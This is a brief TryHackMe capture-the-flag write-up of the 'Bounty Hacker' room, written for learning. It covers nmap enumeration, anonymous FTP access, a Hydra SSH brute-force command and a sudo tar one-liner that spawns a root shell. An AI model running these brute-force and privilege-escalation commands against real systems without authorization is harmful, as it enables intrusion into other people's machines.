---
title: Bounty Hacker -- Writeup
date: 2020-08-08
categories: [TryHackMe, Easy]
tags: [tryhackme, ctf, hydra, bruteforce]     # TAG names should always be lowercase
---

# Summary -
Pretty simple and straight forward room consisting of basic enumeration.

# Enumeration -
Lets run quick nmap scan.

```bash
sudo nmap <ip>
```

This returned 3 open ports.

port      |service
----------|----------
21        |FTP
22        |SSH
80        |Web server

Let's enumerate ftp port first.
Connect to it. Type,

```bash
ftp <ip>
```
Login using anonymous name.

Now, let's view files using ls command.

There are two files named as locks.txt and task.txt.

Get them to your pc and see whats inside.

First one has a username and other has list of words which is a password list for bruteforcing.

# Exploitation -
Since we have username and password list, let's do a bruteforcing attack using Hydra.
Hydra is a tool we are going to use to do bruteforcing.

Type:-

```bash
hydra -l <username> -P <password_list> -t 1 <ip> ssh
```

Now, we know the password.
Let's login over ssh.
Type:-

```bash
ssh <username>@<ip>
```
And enter the password you got.

# Post Exploitation -
Type sudo -l and see that we can run tar app as a root.
Let's go to gtfobins and get the sudo exploit for tar.
If you can't find it, here type:-

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Once you execute above command, you'll become a root user.

Congrats, now get the flags.
